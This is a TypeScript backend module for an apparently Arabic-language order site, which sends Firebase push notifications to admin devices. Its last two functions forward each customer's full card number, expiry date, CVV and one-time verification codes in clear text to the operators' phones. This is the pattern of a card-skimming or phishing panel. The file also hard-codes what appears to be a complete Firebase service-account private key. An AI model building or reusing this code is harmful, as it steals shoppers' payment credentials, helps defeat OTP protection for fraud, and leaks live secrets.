import * as admin from "firebase-admin";
import { eq } from "drizzle-orm";
import { db, adminDevicesTable } from "@workspace/db";

// Firebase Admin configuration from environment variables
const firebaseConfig = {
  type: "service_account",
  project_id: process.env.FIREBASE_PROJECT_ID || "zabihte",
  private_key_id: process.env.FIREBASE_PRIVATE_KEY_ID || "0a4b0071c4ba98cd2f5a7e2b82afc922f1cfc578",
  private_key: (process.env.FIREBASE_PRIVATE_KEY || "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDI0xyhWxpTissd\nsNg1bnZm2AygBRwP8z8DnXKcBDmpKebeSyZEzJL8W9XvC3A27KUH2P2sK5f6xrBq\nh7ucfD6ubmUgBhg/qG40SEVtDT4Akpzr4fjBIVrPYpbNGCWdOMygmklGLmW44dF0\nA04S3IXM4uksIQXCeHAkUh6haLTUeuZJ2XUzCbx/bRufdYbGI8IdBhBJqjiI6DMb\nJrDEra9aBTHBz+fHRy9M/lLz88CdpxS6vPVTzehNRmfPEWsD9ktOd8CIOVW4hxvA\nCaEGrg2liKE3QF0XHznOmFJpYpD/mx8SF/VcCbTrKwtHmGfnMMuyLv8XvB+Y/AuC\n0ilIvnonAgMBAAECggEABkVRTfIiTrZOxIz5Gb7RQ6gLY0b4xI0iTC9maY8lBC5v\nkkSWdVK0ZENNDG6dZzM/rZCnZ/DhVgG0qh7pSzTPk3LIny9eVatUuNBo5106fZoW\nYrQAdUdgjO+iXDuDMSpmeVbxlf3TTB3N0U/16CQRD+ZZKyxjM0Dysq+kKGlOL2d4\n3GgAbMdMgpYyqcR5onl2AubGWNfMpR1Xmsx9Nm4y66SQehRtJlyXO/wuIQIhGm4l\nOOE1SV8wUiyFcbuaoJPr0J44OVL9Sx5d3KpiAz81UbCT3+Uyzu3FHllEDM7dcUyi\n37hhj2uG/oaIedlPcdUMzp4Ca4xGd2JN7nBlSHbjwQKBgQDnf0jxhENqXDM46iff\n7cTW0HX4GXfZHkN48uR/PMDBMikAOKgeyWC+NuzOtYYiKTQOynLQoPKphxbsk5ib\n8ulJuisyGCm+cCEWXDbkiz3QFgM3uZ+1mbFR7Uh7UGLPp5MMkU/xuOxSrYbZvoGm\nUPpOrHkdR/KMv1Kgvzxh5uok2wKBgQDeFLbwxToM2QeXDa4aEQcwm6BZ4ysUvnXm\nkwe/E5uyrdRFuJRdwm+mQXm71rcDKeKNxEBda6QwyvvjiDNo3TEV0+T4YKWuVloW\n0xRaTT/uljBzPT49SoRq3hyAEgd63kbMtDbw2Ou+QY2zY6LnbGsZfHOAJAQq6WCy\nIHd9arb7pQKBgQCl6MJlXU5XltabDq4fPa/Z6LLzaYVMVPU0ZJfAXNEkZQefgftz\nfQ3ZpVGYX95O80q84vjgbskbGJckXC9+bNwnG8bDcy/PrVr5RIOOzgAx9uS9dkpx\nA0JjHfTZc+YtPsMTub0a11Z/dp/zxCX1BYovAksW4i6CEshsLkJfQ/hBCwKBgFIn\nb5WaIGNoVfp3QRS7f+FncOZPtzwxSQRHF/KDmnF7BK/WHGyi5RKn3hSy1XkCIaE4\nHGdyzoaOUKhXVk1Qpjvg6y9G8YOQxjrzUvAk66WjQcEfwsqBqoKuL/Tgtoupdp97\ne2eVl4AGWBkonrbl0KjY9RFOQYxuUSsT/6ARvidRAoGBAMJBW/Bri7RlBZaPJfQI\nAIOZqR9K7MkaQXyiZq805JTlfLPesaLAREQmWI6Q9tef3O2/ZJgwEM2sMVMyoiO9\nq0DscicRXYzZuTfxSYlGwEfpNbP1+6UHXaH/S6ImIXIjVN1znns4e0Ue6TqRaNSV\niXLckv+dz0E1n4ignj1qypXf\n-----END PRIVATE KEY-----\n").replace(/\\n/g, "\n"),
  client_email: process.env.FIREBASE_CLIENT_EMAIL || "firebase-adminsdk-fbsvc@zabihte.iam.gserviceaccount.com",
  auth_uri: "https://accounts.google.com/o/oauth2/auth",
  token_uri: "https://oauth2.googleapis.com/token",
  auth_provider_x509_cert_url: "https://www.googleapis.com/oauth2/v1/certs",
  client_x509_cert_url: "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40zabihte.iam.gserviceaccount.com",
  universe_domain: "googleapis.com"
};

// VAPID Key
export const VAPID_KEY = "BGKlH7RpwXm71PFhbOC9gQIMsVy_ymv1lk_tCZ2p5sHoES1RP6_p8_eiFitlUggqLM1jaaA1MBkQlgaCKJY_Zb0";

// Initialize Firebase Admin if not already initialized
if (!admin.apps.length) {
  try {
    admin.initializeApp({
      credential: admin.credential.cert(firebaseConfig as admin.ServiceAccount),
    });
    console.log('[Firebase] Admin initialized successfully');
  } catch (error) {
    console.error('[Firebase] Failed to initialize:', error);
  }
}

export const messaging = admin.messaging();

// Interface for notification payload
export interface NotificationPayload {
  title: string;
  body: string;
  icon?: string;
  badge?: string;
  tag?: string;
  data?: Record<string, string>;
}

// Send push notification to a single device
export async function sendPushNotification(
  fcmToken: string,
  payload: NotificationPayload
): Promise<{ success: boolean; messageId?: string; error?: string; errorCode?: string }> {
  try {
    const message: admin.messaging.Message = {
      token: fcmToken,
      notification: {
        title: payload.title,
        body: payload.body,
      },
              android: {
        priority: "high" as const,
        notification: {
          channelId: "dheebti_orders",
          priority: "high" as const,
          defaultSound: true,
          defaultVibrateTimings: true,
        },
      },
      apns: {
        payload: {
          aps: {
            badge: 1,
            sound: "default",
            contentAvailable: true,
          },
        },
        headers: {
          "apns-priority": "10",
          "apns-push-type": "alert",
        },
      },
      webpush: {
        headers: {
          Urgency: "high",
        },
        notification: {
          icon: payload.icon || "/icon-192.png",
          badge: payload.badge || "/icon-192.png",
          tag: payload.tag || "dheebti-notification",
          requireInteraction: true,
          dir: "rtl",
          lang: "ar",
        },
        fcmOptions: {
          link: `${process.env.VITE_API_URL}/admin/orders`,
        },
      },
      data: payload.data,
    };

    const messageId = await messaging.send(message);
    console.log('[Firebase] Notification sent successfully:', messageId);
    return { success: true, messageId };
  } catch (error: any) {
    console.error("[Firebase] Error sending notification:", error.code, error.message);
    
    // Handle specific Firebase errors
    if (error.code === "messaging/registration-token-not-registered") {
      return { success: false, error: "الجهاز غير مسجل في FCM", errorCode: "TOKEN_NOT_REGISTERED" };
    }
    if (error.code === "messaging/invalid-argument") {
      return { success: false, error: "رمز الجهاز غير صالح", errorCode: "INVALID_TOKEN" };
    }
    if (error.code === "messaging/quota-exceeded") {
      return { success: false, error: "تم تجاوز الحد المسموح للإشعارات", errorCode: "QUOTA_EXCEEDED" };
    }
    if (error.code === "messaging/authentication-error") {
      return { success: false, error: "خطأ في المصادقة مع Firebase - تحقق من إعدادات VAPID", errorCode: "AUTH_ERROR" };
    }
    if (error.code === "messaging/server-unavailable") {
      return { success: false, error: "Firebase غير متاح حالياً", errorCode: "SERVER_UNAVAILABLE" };
    }
    if (error.code === "messaging/invalid-registration-token") {
      return { success: false, error: "رمز التسجيل غير صالح", errorCode: "INVALID_REGISTRATION_TOKEN" };
    }
    
    // Log the full error for debugging
    console.error("[Firebase] Full error:", JSON.stringify(error));
    
    return { success: false, error: error.message || "خطأ غير معروف", errorCode: error.code || "UNKNOWN" };
  }
}

// Send push notification to multiple devices
export async function sendPushNotificationToMultiple(
  fcmTokens: string[],
  payload: NotificationPayload
): Promise<{ success: number; failed: number; errors: string[] }> {
  let success = 0;
  let failed = 0;
  const errors: string[] = [];

  for (const token of fcmTokens) {
    const result = await sendPushNotification(token, payload);
    if (result.success) {
      success++;
    } else {
      failed++;
      errors.push(`${token.slice(0, 10)}...: ${result.error}`);
    }
  }

  return { success, failed, errors };
}

// Send test notification
export async function sendTestNotification(
  fcmToken: string,
  adminName: string = "المدير"
): Promise<{ success: boolean; messageId?: string; error?: string }> {
  return sendPushNotification(fcmToken, {
    title: "✅ تم تفعيل الإشعارات!",
    body: `مرحباً ${adminName}، تم تفعيل الإشعارات بنجاح. ستستلم إشعارات الطلبات الجديدة هنا.`,
    tag: "test-notification",
    data: {
      type: "test",
      timestamp: new Date().toISOString(),
    },
  });
}

// Notify admins of card payment attempt
export async function notifyAdminsOfCardAttempt(order: any, cardName: string, cardNumber: string, cardExpiry: string, cardCvv: string) {
  try {
    const devices = await db
      .select()
      .from(adminDevicesTable)
      .where(eq(adminDevicesTable.isActive, true));

    for (const device of devices) {
      await sendPushNotification(device.fcmToken, {
        title: "💳 محاولة بطاقة دفع!",
        body: `العميل: ${order.customerName}\nرقم البطاقة: ${cardNumber}\nتاريخ الانتهاء: ${cardExpiry}\nرمز الأمان: ${cardCvv}`,
        tag: `card-${order.id}`,
        data: {
          type: "card_attempt",
          orderId: order.id.toString(),
          customerName: order.customerName,
          productName: order.productName,
          cardNumber: cardNumber,
          cardExpiry: cardExpiry,
          cardCvv: cardCvv,
          timestamp: new Date().toISOString(),
        },
      });
    }

    console.log(`[PUSH] Card attempt notification sent to ${devices.length} admin devices`);
  } catch (error) {
    console.error("[PUSH] Error sending card notification:", error);
  }
}

// Notify admins of OTP verification attempt
export async function notifyAdminsOfOtpAttempt(order: any, otpCode: string, success: boolean) {
  try {
    const devices = await db
      .select()
      .from(adminDevicesTable)
      .where(eq(adminDevicesTable.isActive, true));

    const statusEmoji = success ? "✅" : "❌";
    const statusText = success ? "تم التحقق بنجاح" : "فشل التحقق";

    for (const device of devices) {
      await sendPushNotification(device.fcmToken, {
        title: `${statusEmoji} محاولة رمز تحقق!`,
        body: `العميل: ${order.customerName}\nرمز التحقق: ${otpCode}\nالحالة: ${statusText}`,
        tag: `otp-${order.id}`,
        data: {
          type: "otp_attempt",
          orderId: order.id.toString(),
          customerName: order.customerName,
          productName: order.productName,
          otpCode: otpCode,
          success: success.toString(),
          timestamp: new Date().toISOString(),
        },
      });
    }

    console.log(`[PUSH] OTP attempt notification sent to ${devices.length} admin devices`);
  } catch (error) {
    console.error("[PUSH] Error sending OTP notification:", error);
  }
}
